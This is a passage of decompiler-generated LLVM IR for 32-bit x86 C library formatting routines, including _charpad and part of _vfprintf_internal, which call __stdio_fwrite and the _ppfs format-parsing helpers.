  %v0_805bfcb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bfc2

dec_label_pc_805bfc2:                             ; preds = %dec_label_pc_805bf9c.dec_label_pc_805bfc2_crit_edge, %dec_label_pc_805bfab.dec_label_pc_805bfc2_crit_edge
  %v0_805bfcb = phi i32 [ %v0_805bfb5, %dec_label_pc_805bf9c.dec_label_pc_805bfc2_crit_edge ], [ %v0_805bfcb.pre, %dec_label_pc_805bfab.dec_label_pc_805bfc2_crit_edge ]
  %v4_805bfcc = inttoptr i32 %arg2 to i8*
  %v5_805bfcc = call i32 @_vfprintf_internal(i32 %v0_805bfcb, i8* %v4_805bfcc, i32 %arg3)
  store i32 %v5_805bfcc, i32* @ebx, align 4
  br label %dec_label_pc_805bfd6

dec_label_pc_805bfd6:                             ; preds = %dec_label_pc_805bfab, %dec_label_pc_805bfc2
  br i1 %v1_805bf7b, label %dec_label_pc_805bfeb, label %dec_label_pc_805bfda

dec_label_pc_805bfda:                             ; preds = %dec_label_pc_805bfd6
  %v4_805bfe3 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_805bfeb

dec_label_pc_805bfeb:                             ; preds = %dec_label_pc_805bfd6, %dec_label_pc_805bfda
  %v0_805bfee = load i32, i32* @ebx, align 4
  store i32 %v0_805bf6e, i32* @ebx, align 4
  store i32 %v0_805bf6d, i32* @esi, align 4
  store i32 %v0_805bf6c, i32* @edi, align 4
  ret i32 %v0_805bfee

; uselistorder directives
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_805bfeb, { 1, 0 }
  uselistorder label %dec_label_pc_805bfd6, { 1, 0 }
  uselistorder label %dec_label_pc_805bfc2, { 1, 0 }
  uselistorder label %dec_label_pc_805bf9c, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_805bff4 = load i32, i32* @edi, align 4
  %v0_805bff5 = load i32, i32* @eax, align 4
  store i32 %v0_805bff5, i32* @edi, align 4
  %v0_805bff7 = load i32, i32* @esi, align 4
  %v0_805bff8 = load i32, i32* @ecx, align 4
  store i32 %v0_805bff8, i32* @esi, align 4
  %v0_805bffa = load i32, i32* @ebx, align 4
  store i32 %v0_805bff8, i32* @ebx, align 4
  %v0_805c000 = load i32, i32* @edx, align 4
  store i32 %v0_805c000, i32* %stack_var_-13, align 4
  %v1_805c0072 = icmp eq i32 %v0_805bff8, 0
  br i1 %v1_805c0072, label %dec_label_pc_805c01f, label %dec_label_pc_805c00b.lr.ph

dec_label_pc_805c00b.lr.ph:                       ; preds = %entry
  %v2_805c00b = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_805c00b

dec_label_pc_805c006:                             ; preds = %dec_label_pc_805c00b
  %v1_805c006 = add i32 %v0_805c006, -1
  %v8_805c006 = icmp eq i32 %v1_805c006, 0
  store i32 %v1_805c006, i32* @ebx, align 4
  br i1 %v8_805c006, label %dec_label_pc_805c01f.loopexit, label %dec_label_pc_805c006.dec_label_pc_805c00b_crit_edge

dec_label_pc_805c006.dec_label_pc_805c00b_crit_edge: ; preds = %dec_label_pc_805c006
  %v0_805c00f.pre = load i32, i32* @edx, align 4
  %v0_805c010.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805c00b

dec_label_pc_805c00b:                             ; preds = %dec_label_pc_805c006.dec_label_pc_805c00b_crit_edge, %dec_label_pc_805c00b.lr.ph
  %v0_805c010 = phi i32 [ %v0_805c010.pre, %dec_label_pc_805c006.dec_label_pc_805c00b_crit_edge ], [ %v0_805bff5, %dec_label_pc_805c00b.lr.ph ]
  %v0_805c00f = phi i32 [ %v0_805c00f.pre, %dec_label_pc_805c006.dec_label_pc_805c00b_crit_edge ], [ %v0_805c000, %dec_label_pc_805c00b.lr.ph ]
  %v4_805c014 = call i32 @__stdio_fwrite(i32 %v2_805c00b, i32 1, i32 %v0_805c010, i32 %v0_805c00f)
  %v8_805c01c = icmp eq i32 %v4_805c014, 1
  %v0_805c006 = load i32, i32* @ebx, align 4
  br i1 %v8_805c01c, label %dec_label_pc_805c006, label %dec_label_pc_805c01f.loopexit

dec_label_pc_805c01f.loopexit:                    ; preds = %dec_label_pc_805c006, %dec_label_pc_805c00b
  %v1_805c022.ph = phi i32 [ %v0_805c006, %dec_label_pc_805c00b ], [ 0, %dec_label_pc_805c006 ]
  %v0_805c022.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c01f

dec_label_pc_805c01f:                             ; preds = %dec_label_pc_805c01f.loopexit, %entry
  %v0_805c022 = phi i32 [ 0, %entry ], [ %v0_805c022.pre, %dec_label_pc_805c01f.loopexit ]
  %v1_805c022 = phi i32 [ 0, %entry ], [ %v1_805c022.ph, %dec_label_pc_805c01f.loopexit ]
  %v2_805c022 = sub i32 %v0_805c022, %v1_805c022
  store i32 %v0_805bffa, i32* @ebx, align 4
  store i32 %v0_805bff7, i32* @esi, align 4
  store i32 %v0_805bff4, i32* @edi, align 4
  ret i32 %v2_805c022

; uselistorder directives
  uselistorder i32 %v1_805c006, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_805c01f.loopexit, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805c097 = load i32, i32* @ebx, align 4
  store i32 %v0_805c097, i32* %stack_var_-16, align 4
  %v4_805c097 = ptrtoint i32* %stack_var_-16 to i32
  %v1_805c098 = add i32 %v4_805c097, -356
  %v10_805c098 = icmp slt i32 %v1_805c098, 0
  store i1 %v10_805c098, i1* %sf.global-to-local, align 1
  %v4_805c09e = ptrtoint i8* %arg2 to i32
  store i32 %v4_805c09e, i32* @ebx, align 4
  %v2_805c0a6 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_805c0a6, i32* @esi, align 4
  %v5_805c0ab = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_805c09e)
  store i32 %v5_805c0ab, i32* %eax.global-to-local, align 4
  %v2_805c0b3 = icmp slt i32 %v5_805c0ab, 0
  store i1 %v2_805c0b3, i1* %sf.global-to-local, align 1
  %v1_805c0b5 = icmp eq i1 %v2_805c0b3, false
  br i1 %v1_805c0b5, label %dec_label_pc_805c0f5, label %dec_label_pc_805c0b7

dec_label_pc_805c0b7:                             ; preds = %entry
  %v12_805c0b0 = ptrtoint i32* %stack_var_-364 to i32
  %v3_805c0b7 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_805c0b7, i32* @ebx, align 4
  %v1_805c0bb = add i32 %v12_805c0b0, -12
  %v10_805c0bb = icmp slt i32 %v1_805c0bb, 0
  store i1 %v10_805c0bb, i1* %sf.global-to-local, align 1
  %v5_805c0be = inttoptr i32 %v3_805c0b7 to i8*
  %v3_805c0bf = call i32 @strlen(i8* %v5_805c0be)
  store i32 %v3_805c0bf, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_805c0ce = icmp eq i32 %v3_805c0bf, 0
  %v2_805c0ce = icmp slt i32 %v3_805c0bf, 0
  store i1 %v2_805c0ce, i1* %sf.global-to-local, align 1
  br i1 %v1_805c0ce, label %dec_label_pc_805c63e, label %dec_label_pc_805c0d6

dec_label_pc_805c0d6:                             ; preds = %dec_label_pc_805c0b7
  %v0_805c0d6 = load i32, i32* @edx, align 4
  %v0_805c0df = load i32, i32* @ebx, align 4
  %v6_805c0e0 = call i32 @__stdio_fwrite(i32 %v0_805c0df, i32 %v3_805c0bf, i32 %arg1, i32 %v0_805c0d6)
  store i32 %v6_805c0e0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_805c0ed = load i32, i32* @esp, align 4
  %v1_805c0ed = add i32 %v0_805c0ed, 16
  %v7_805c0ed = icmp slt i32 %v1_805c0ed, 0
  store i1 %v7_805c0ed, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805c63e

dec_label_pc_805c0f5:                             ; preds = %entry
  %v6_805c0ff = call i32 @_ppfs_prepargs(i32 %v2_805c0a6, i32 %arg3, i32 %v5_805c0ab, i32 %v5_805c0ab)
  store i32 %v6_805c0ff, i32* %eax.global-to-local, align 4
  %v0_805c104 = load i32, i32* @ebx, align 4
  store i32 %v0_805c104, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_805c10e = load i32, i32* @esp, align 4
  %v1_805c10e = add i32 %v0_805c10e, 16
  %v7_805c10e = icmp slt i32 %v1_805c10e, 0
  store i1 %v7_805c10e, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805c114

dec_label_pc_805c113:                             ; preds = %dec_label_pc_805c11a
  %v1_805c113 = add i32 %v0_805c122, 1
  %v9_805c113 = icmp slt i32 %v1_805c113, 0
  store i1 %v9_805c113, i1* %sf.global-to-local, align 1
  store i32 %v1_805c113, i32* @ebx, align 4
  br label %dec_label_pc_805c114.backedge

dec_label_pc_805c114.backedge:                    ; preds = %dec_label_pc_805c113, %dec_label_pc_805c624, %dec_label_pc_805c62f
  %v1_805c11e21 = phi i32 [ %v1_805c126, %dec_label_pc_805c113 ], [ %v3_805c624, %dec_label_pc_805c624 ], [ %v1_805c152, %dec_label_pc_805c62f ]
  %v0_805c11419 = phi i32 [ %v1_805c113, %dec_label_pc_805c113 ], [ %v3_805c624, %dec_label_pc_805c624 ], [ %v1_805c62f, %dec_label_pc_805c62f ]
  %v4_805c114.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c114

dec_label_pc_805c114:                             ; preds = %dec_label_pc_805c114.backedge, %dec_label_pc_805c0f5
  %v1_805c126 = phi i32 [ %v1_805c11e21, %dec_label_pc_805c114.backedge ], [ %v0_805c104, %dec_label_pc_805c0f5 ]
  %v0_805c122 = phi i32 [ %v0_805c11419, %dec_label_pc_805c114.backedge ], [ %v0_805c104, %dec_label_pc_805c0f5 ]
  %v4_805c114 = phi i32 [ %v4_805c114.pre, %dec_label_pc_805c114.backedge ], [ %v6_805c0ff, %dec_label_pc_805c0f5 ]
  %v1_805c114 = inttoptr i32 %v0_805c122 to i8*
  %v2_805c114 = load i8, i8* %v1_805c114, align 1
  %v3_805c114 = zext i8 %v2_805c114 to i32
  %v5_805c114 = and i32 %v4_805c114, -256
  %v6_805c114 = or i32 %v3_805c114, %v5_805c114
  store i32 %v6_805c114, i32* %eax.global-to-local, align 4
  %v4_805c116 = icmp eq i8 %v2_805c114, 0
  %v5_805c116 = icmp slt i8 %v2_805c114, 0
  store i1 %v5_805c116, i1* %sf.global-to-local, align 1
  br i1 %v4_805c116, label %dec_label_pc_805c11e, label %dec_label_pc_805c11a

dec_label_pc_805c11a:                             ; preds = %dec_label_pc_805c114
  %v2_805c11a = add i8 %v2_805c114, -37
  %v10_805c11a = icmp eq i8 %v2_805c11a, 0
  %v11_805c11a = icmp slt i8 %v2_805c11a, 0
  store i1 %v11_805c11a, i1* %sf.global-to-local, align 1
  %v1_805c11c = icmp eq i1 %v10_805c11a, false
  br i1 %v1_805c11c, label %dec_label_pc_805c113, label %dec_label_pc_805c11e

dec_label_pc_805c11e:                             ; preds = %dec_label_pc_805c11a, %dec_label_pc_805c114
  %v2_805c11e = sub i32 %v0_805c122, %v1_805c126
  %v12_805c11e = icmp eq i32 %v2_805c11e, 0
  %v13_805c11e = icmp slt i32 %v2_805c11e, 0
  store i1 %v13_805c11e, i1* %sf.global-to-local, align 1
  br i1 %v12_805c11e, label %dec_label_pc_805c149, label %dec_label_pc_805c122

dec_label_pc_805c122:                             ; preds = %dec_label_pc_805c11e
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805c11e, i32* @esi, align 4
  store i1 %v13_805c11e, i1* %sf.global-to-local, align 1
  %tmp66 = icmp slt i32 %v2_805c11e, 1
  br i1 %tmp66, label %dec_label_pc_805c13e, label %dec_label_pc_805c12c

dec_label_pc_805c12c:                             ; preds = %dec_label_pc_805c122
  %v0_805c12c = load i32, i32* @ebp, align 4
  %v1_805c12c = load i32, i32* @esp, align 4
  %v2_805c12c = add i32 %v1_805c12c, -4
  %v3_805c12c = inttoptr i32 %v2_805c12c to i32*
  store i32 %v0_805c12c, i32* %v3_805c12c, align 4
  %v1_805c12d = add i32 %v1_805c12c, 368
  %v2_805c12d = inttoptr i32 %v1_805c12d to i32*
  %v3_805c12d = load i32, i32* %v2_805c12d, align 4
  %v5_805c12d = add i32 %v1_805c12c, -8
  %v6_805c12d = inttoptr i32 %v5_805c12d to i32*
  store i32 %v3_805c12d, i32* %v6_805c12d, align 4
  %v0_805c134 = load i32, i32* @esi, align 4
  %v2_805c134 = add i32 %v1_805c12c, -12
  %v3_805c134 = inttoptr i32 %v2_805c134 to i32*
  store i32 %v0_805c134, i32* %v3_805c134, align 4
  %v0_805c135 = load i32, i32* %edx.global-to-local, align 4
  %v2_805c135 = add i32 %v1_805c12c, -16
  %v3_805c135 = inttoptr i32 %v2_805c135 to i32*
  store i32 %v0_805c135, i32* %v3_805c135, align 4
  %v0_805c136 = load i32, i32* %stack_var_-364, align 4
  %v4_805c136 = call i32 @__stdio_fwrite(i32 %v0_805c136, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805c136, i32* %eax.global-to-local, align 4
  %v0_805c13b = load i32, i32* @esp, align 4
  %v1_805c13b = add i32 %v0_805c13b, 16
  %v7_805c13b = icmp slt i32 %v1_805c13b, 0
  store i1 %v7_805c13b, i1* %sf.global-to-local, align 1
  %v1_805c13e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c13e

dec_label_pc_805c13e:                             ; preds = %dec_label_pc_805c122, %dec_label_pc_805c12c
  %v3_805c146 = phi i32 [ %v2_805c11e, %dec_label_pc_805c122 ], [ %v1_805c13e.pre, %dec_label_pc_805c12c ]
  %v0_805c13e = phi i32 [ 0, %dec_label_pc_805c122 ], [ %v4_805c136, %dec_label_pc_805c12c ]
  %v2_805c13e = sub i32 %v0_805c13e, %v3_805c146
  %v12_805c13e = icmp eq i32 %v2_805c13e, 0
  %v13_805c13e = icmp slt i32 %v2_805c13e, 0
  store i1 %v13_805c13e, i1* %sf.global-to-local, align 1
  %v1_805c140 = icmp eq i1 %v12_805c13e, false
  %v0_805c637.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_805c140, label %dec_label_pc_805c637, label %dec_label_pc_805c146

dec_label_pc_805c146:                             ; preds = %dec_label_pc_805c13e
  %v1_805c146 = inttoptr i32 %v0_805c637.pre.pre to i32*
  %v2_805c146 = load i32, i32* %v1_805c146, align 4
  %v4_805c146 = add i32 %v2_805c146, %v3_805c146
  %v15_805c146 = icmp slt i32 %v4_805c146, 0
  store i1 %v15_805c146, i1* %sf.global-to-local, align 1
  store i32 %v4_805c146, i32* %v1_805c146, align 4
  %v0_805c149.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c149

dec_label_pc_805c149:                             ; preds = %dec_label_pc_805c11e, %dec_label_pc_805c146
  %v0_805c62f = phi i32 [ %v0_805c122, %dec_label_pc_805c11e ], [ %v0_805c149.pre, %dec_label_pc_805c146 ]
  %v1_805c149 = inttoptr i32 %v0_805c62f to i8*
  %v2_805c149 = load i8, i8* %v1_805c149, align 1
  %v3_805c149 = icmp eq i8 %v2_805c149, 0
  %v4_805c149 = icmp slt i8 %v2_805c149, 0
  store i1 %v4_805c149, i1* %sf.global-to-local, align 1
  br i1 %v3_805c149, label %dec_label_pc_805c63e, label %dec_label_pc_805c152

dec_label_pc_805c152:                             ; preds = %dec_label_pc_805c149
  %v1_805c152 = add i32 %v0_805c62f, 1
  %v2_805c152 = inttoptr i32 %v1_805c152 to i8*
  %v3_805c152 = load i8, i8* %v2_805c152, align 1
  %v4_805c152 = add i8 %v3_805c152, -37
  %v12_805c152 = icmp eq i8 %v4_805c152, 0
  %v13_805c152 = icmp slt i8 %v4_805c152, 0
  store i1 %v13_805c152, i1* %sf.global-to-local, align 1
  store i32 %v1_805c152, i32* %edx.global-to-local, align 4
  br i1 %v12_805c152, label %dec_label_pc_805c62f, label %dec_label_pc_805c15f

dec_label_pc_805c15f:                             ; preds = %dec_label_pc_805c152
  %v1_805c15f = load i32, i32* @esp, align 4
  %v2_805c15f = add i32 %v1_805c15f, 16
  %v3_805c15f = inttoptr i32 %v2_805c15f to i32*
  store i32 %v1_805c152, i32* %v3_805c15f, align 4
  %v0_805c163 = load i32, i32* @esp, align 4
  %v1_805c163 = add i32 %v0_805c163, 340
  %v2_805c163 = inttoptr i32 %v1_805c163 to i32*
  store i32 0, i32* %v2_805c163, align 4
  %v0_805c16e = load i32, i32* @esp, align 4
  %v1_805c16e = add i32 %v0_805c16e, -12
  %v10_805c16e = icmp slt i32 %v1_805c16e, 0
  store i1 %v10_805c16e, i1* %sf.global-to-local, align 1
  %v1_805c171 = add i32 %v0_805c16e, 16
  store i32 %v1_805c171, i32* @ebx, align 4
  %v2_805c175 = add i32 %v0_805c16e, -16
  %v3_805c175 = inttoptr i32 %v2_805c175 to i32*
  store i32 %v1_805c171, i32* %v3_805c175, align 4
  %v0_805c176 = load i32, i32* %stack_var_-364, align 4
  %v1_805c176 = inttoptr i32 %v0_805c176 to i32*
  %v2_805c176 = call i32 @_ppfs_parsespec(i32* %v1_805c176)
  store i32 %v2_805c176, i32* %eax.global-to-local, align 4
  %v0_805c17b = load i32, i32* @ebx, align 4
  %v1_805c17b = load i32, i32* @esp, align 4
  %v2_805c17b = inttoptr i32 %v1_805c17b to i32*
  store i32 %v0_805c17b, i32* %v2_805c17b, align 4
  %v0_805c17e = load i32, i32* %stack_var_-364, align 4
  %v1_805c17e = call i32 @_ppfs_setargs(i32 %v0_805c17e)
  store i32 %v1_805c17e, i32* %eax.global-to-local, align 4
  %v0_805c183 = load i32, i32* @esp, align 4
  %v1_805c183 = add i32 %v0_805c183, 70
  %v2_805c183 = inttoptr i32 %v1_805c183 to i8*
  %v3_805c183 = load i8, i8* %v2_805c183, align 1
  %v4_805c183 = zext i8 %v3_805c183 to i32
  store i32 %v4_805c183, i32* @edi, align 4
  %v1_805c188 = add i32 %v0_805c183, 16
  %v1_805c18b = add i32 %v0_805c183, 56
  %v2_805c18b = inttoptr i32 %v1_805c18b to i32*
  %v3_805c18b = load i32, i32* %v2_805c18b, align 4
  %v5_805c18b = icmp slt i32 %v3_805c18b, 0
  store i1 %v5_805c18b, i1* %sf.global-to-local, align 1
  %v1_805c190 = add i32 %v0_805c183, 112
  store i32 %v1_805c190, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_805c18b, 1
  br i1 %tmp67, label %dec_label_pc_805c19d, label %dec_label_pc_805c196

dec_label_pc_805c196:                             ; preds = %dec_label_pc_805c15f
  %v3_805c196 = mul nuw nsw i32 %v4_805c183, 12
  store i32 %v3_805c196, i32* %eax.global-to-local, align 4
  %v2_805c199 = add i32 %v0_805c183, 100
  %v3_805c199 = add i32 %v2_805c199, %v3_805c196
  store i32 %v3_805c199, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c19d

dec_label_pc_805c19d:                             ; preds = %dec_label_pc_805c15f, %dec_label_pc_805c196
  %v0_805c1a528 = phi i32 [ %v1_805c190, %dec_label_pc_805c15f ], [ %v3_805c199, %dec_label_pc_805c196 ]
  %v1_805c19d = add i32 %v0_805c183, 60
  %v2_805c19d = inttoptr i32 %v1_805c19d to i32*
  %v3_805c19d = load i32, i32* %v2_805c19d, align 4
  store i32 %v3_805c19d, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805c1b073 = sub i32 0, %v3_805c19d
  %v10_805c1b076 = and i32 %v3_805c19d, %v2_805c1b073
  %v11_805c1b077 = icmp slt i32 %v10_805c1b076, 0
  %v13_805c1b078 = icmp slt i32 %v2_805c1b073, 0
  %v2_805c1b279 = icmp eq i1 %v13_805c1b078, %v11_805c1b077
  br i1 %v2_805c1b279, label %dec_label_pc_805c1b4, label %dec_label_pc_805c1a5

dec_label_pc_805c1a5:                             ; preds = %dec_label_pc_805c19d, %dec_label_pc_805c1a5
  %v0_805c1b483 = phi i32 [ %v0_805c1b4, %dec_label_pc_805c1a5 ], [ %v1_805c188, %dec_label_pc_805c19d ]
  %v2_805c1a582 = phi i32 [ %v1_805c1af, %dec_label_pc_805c1a5 ], [ 0, %dec_label_pc_805c19d ]
  %v0_805c1a581 = phi i32 [ %v1_805c1ac, %dec_label_pc_805c1a5 ], [ %v0_805c1a528, %dec_label_pc_805c19d ]
  %v3_805c1a5 = mul i32 %v2_805c1a582, 4
  %v4_805c1a5 = add i32 %v3_805c1a5, 344
  %v5_805c1a5 = add i32 %v4_805c1a5, %v0_805c1b483
  %v6_805c1a5 = inttoptr i32 %v5_805c1a5 to i32*
  store i32 %v0_805c1a581, i32* %v6_805c1a5, align 4
  %v0_805c1ac = load i32, i32* %edx.global-to-local, align 4
  %v1_805c1ac = add i32 %v0_805c1ac, 12
  store i32 %v1_805c1ac, i32* %edx.global-to-local, align 4
  %v0_805c1af = load i32, i32* %eax.global-to-local, align 4
  %v1_805c1af = add i32 %v0_805c1af, 1
  %v1_805c1b0.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_805c1af, i32* %eax.global-to-local, align 4
  %v2_805c1b0 = sub i32 %v1_805c1af, %v1_805c1b0.pre
  %v8_805c1b0 = xor i32 %v1_805c1af, %v1_805c1b0.pre
  %v9_805c1b0 = xor i32 %v2_805c1b0, %v1_805c1af
  %v10_805c1b0 = and i32 %v9_805c1b0, %v8_805c1b0
  %v11_805c1b0 = icmp slt i32 %v10_805c1b0, 0
  %v13_805c1b0 = icmp slt i32 %v2_805c1b0, 0
  %v2_805c1b2 = icmp eq i1 %v13_805c1b0, %v11_805c1b0
  %v0_805c1b4 = load i32, i32* @esp, align 4
  br i1 %v2_805c1b2, label %dec_label_pc_805c1b4, label %dec_label_pc_805c1a5

dec_label_pc_805c1b4:                             ; preds = %dec_label_pc_805c1a5, %dec_label_pc_805c19d
  %v0_805c1b4.lcssa = phi i32 [ %v1_805c188, %dec_label_pc_805c19d ], [ %v0_805c1b4, %dec_label_pc_805c1a5 ]
  %v1_805c1b4 = add i32 %v0_805c1b4.lcssa, 48
  %v2_805c1b4 = inttoptr i32 %v1_805c1b4 to i32*
  %v3_805c1b4 = load i32, i32* %v2_805c1b4, align 4
  store i32 %v3_805c1b4, i32* @ecx, align 4
  %v1_805c1b8 = icmp eq i32 %v3_805c1b4, 0
  %v2_805c1b8 = icmp slt i32 %v3_805c1b4, 0
  store i1 %v2_805c1b8, i1* %sf.global-to-local, align 1
  %v1_805c1ba = icmp eq i1 %v1_805c1b8, false
  br i1 %v1_805c1ba, label %dec_label_pc_805c1e2, label %dec_label_pc_805c1bc

dec_label_pc_805c1bc:                             ; preds = %dec_label_pc_805c1b4
  %v1_805c1bc = inttoptr i32 %v0_805c1b4.lcssa to i32*
  %v2_805c1bc = load i32, i32* %v1_805c1bc, align 4
  store i32 %v2_805c1bc, i32* %eax.global-to-local, align 4
  %v1_805c1bf = ashr i32 %v2_805c1bc, 31
  store i32 %v1_805c1bf, i32* %edx.global-to-local, align 4
  %v2_805c1c0 = add i32 %v0_805c1b4.lcssa, -4
  %v3_805c1c0 = inttoptr i32 %v2_805c1c0 to i32*
  store i32 %v1_805c1bf, i32* %v3_805c1c0, align 4
  %v0_805c1c1 = load i32, i32* %eax.global-to-local, align 4
  %v2_805c1c1 = add i32 %v0_805c1b4.lcssa, -8
  %v3_805c1c1 = inttoptr i32 %v2_805c1c1 to i32*
  store i32 %v0_805c1c1, i32* %v3_805c1c1, align 4
  %v1_805c1c2 = add i32 %v0_805c1b4.lcssa, 32
  %v2_805c1c2 = inttoptr i32 %v1_805c1c2 to i32*
  %v3_805c1c2 = load i32, i32* %v2_805c1c2, align 4
  %v1_805c1c6 = and i32 %v3_805c1c2, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_805c1c6, i32* %eax.global-to-local, align 4
  %v2_805c1cb = add i32 %v0_805c1b4.lcssa, -12
  %v3_805c1cb = inttoptr i32 %v2_805c1cb to i32*
  store i32 %v1_805c1c6, i32* %v3_805c1cb, align 4
  %v1_805c1cc = add i32 %v0_805c1b4.lcssa, 344
  %v2_805c1cc = inttoptr i32 %v1_805c1cc to i32*
  %v3_805c1cc = load i32, i32* %v2_805c1cc, align 4
  store i32 %v3_805c1cc, i32* %eax.global-to-local, align 4
  %v1_805c1d3 = inttoptr i32 %v3_805c1cc to i32*
  %v2_805c1d3 = load i32, i32* %v1_805c1d3, align 4
  %v4_805c1d3 = add i32 %v0_805c1b4.lcssa, -16
  %v5_805c1d3 = inttoptr i32 %v4_805c1d3 to i32*
  store i32 %v2_805c1d3, i32* %v5_805c1d3, align 4
  %v0_805c1d5 = call i32 @_store_inttype()
  store i32 %v0_805c1d5, i32* %eax.global-to-local, align 4
  %v0_805c1da = load i32, i32* @esp, align 4
  %v1_805c1da = add i32 %v0_805c1da, 16
  %v7_805c1da = icmp slt i32 %v1_805c1da, 0
  store i1 %v7_805c1da, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805c624

dec_label_pc_805c1e2:                             ; preds = %dec_label_pc_805c1b4
  %v1_805c1e2 = add i32 %v3_805c1b4, -7
  %v5_805c1e2 = icmp ult i32 %v3_805c1b4, 7
  %v9_805c1e2 = icmp eq i32 %v1_805c1e2, 0
  %v10_805c1e2 = icmp slt i32 %v1_805c1e2, 0
  store i1 %v10_805c1e2, i1* %sf.global-to-local, align 1
  %v2_805c1e5 = or i1 %v5_805c1e2, %v9_805c1e2
  br i1 %v2_805c1e5, label %dec_label_pc_805c1eb, label %dec_label_pc_805c34f

dec_label_pc_805c1eb:                             ; preds = %dec_label_pc_805c1e2
  %v1_805c1eb = add i32 %v3_805c1b4, 134666788
  %v2_805c1eb = inttoptr i32 %v1_805c1eb to i8*
  %v3_805c1eb = load i8, i8* %v2_805c1eb, align 1
  %v4_805c1eb = sext i8 %v3_805c1eb to i32
  store i32 %v4_805c1eb, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_805c1f7 = icmp eq i8 %v3_805c1eb, 10
  %v10_805c1f7 = icmp slt i8 %v3_805c1eb, 10
  store i1 %v10_805c1f7, i1* %sf.global-to-local, align 1
  %v1_805c1fa = icmp eq i1 %v9_805c1f7, false
  br i1 %v1_805c1fa, label %dec_label_pc_805c21a, label %dec_label_pc_805c1fc

dec_label_pc_805c1fc:                             ; preds = %dec_label_pc_805c1eb
  %v1_805c1fc = add i32 %v0_805c1b4.lcssa, 32
  %v2_805c1fc = inttoptr i32 %v1_805c1fc to i32*
  %v3_805c1fc = load i32, i32* %v2_805c1fc, align 4
  store i32 %v3_805c1fc, i32* %eax.global-to-local, align 4
  %v1_805c202 = udiv i32 %v3_805c1fc, 32
  %tmp68 = urem i32 %v1_805c202, 2
  %tmp69 = sub nsw i32 45, %tmp68
  %v2_805c212 = or i32 %tmp69, 128
  store i32 %v2_805c212, i32* %edx.global-to-local, align 4
  %v2_805c215 = and i32 %v3_805c1fc, 64
  %v3_805c215 = icmp eq i32 %v2_805c215, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805c217 = icmp eq i1 %v3_805c215, false
  %v4_805c217 = select i1 %v1_805c217, i32 %v2_805c212, i32 %tmp69
  store i32 %v4_805c217, i32* @ebx, align 4
  br label %dec_label_pc_805c21a

dec_label_pc_805c21a:                             ; preds = %dec_label_pc_805c1eb, %dec_label_pc_805c1fc
  %v1_805c21a = add i32 %v3_805c1b4, -5
  %v5_805c21a = icmp ult i32 %v3_805c1b4, 5
  %v9_805c21a = icmp eq i32 %v1_805c21a, 0
  %v10_805c21a = icmp slt i32 %v1_805c21a, 0
  store i1 %v10_805c21a, i1* %sf.global-to-local, align 1
  %v2_805c21d = or i1 %v5_805c21a, %v9_805c21a
  br i1 %v2_805c21d, label %dec_label_pc_805c21f, label %dec_label_pc_805c237

dec_label_pc_805c21f:                             ; preds = %dec_label_pc_805c21a
  %v1_805c21f = add i32 %v3_805c1b4, -3
  %v9_805c21f = icmp eq i32 %v1_805c21f, 0
  %v10_805c21f = icmp slt i32 %v1_805c21f, 0
  store i1 %v10_805c21f, i1* %sf.global-to-local, align 1
  %v1_805c222 = icmp eq i1 %v9_805c21f, false
  br i1 %v1_805c222, label %dec_label_pc_805c22b, label %dec_label_pc_805c224

dec_label_pc_805c224:                             ; preds = %dec_label_pc_805c21f
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_805c239

dec_label_pc_805c22b:                             ; preds = %dec_label_pc_805c21f
  %v1_805c22b = add i32 %v3_805c1b4, -1
  %v9_805c22b = icmp eq i32 %v1_805c22b, 0
  %v10_805c22b = icmp slt i32 %v1_805c22b, 0
  store i1 %v10_805c22b, i1* %sf.global-to-local, align 1
  br i1 %v9_805c22b, label %dec_label_pc_805c23e, label %dec_label_pc_805c239

dec_label_pc_805c237:                             ; preds = %dec_label_pc_805c21a
  %v1_805c237 = sub nsw i32 0, %v4_805c1eb
  %v7_805c237 = icmp sgt i8 %v3_805c1eb, 0
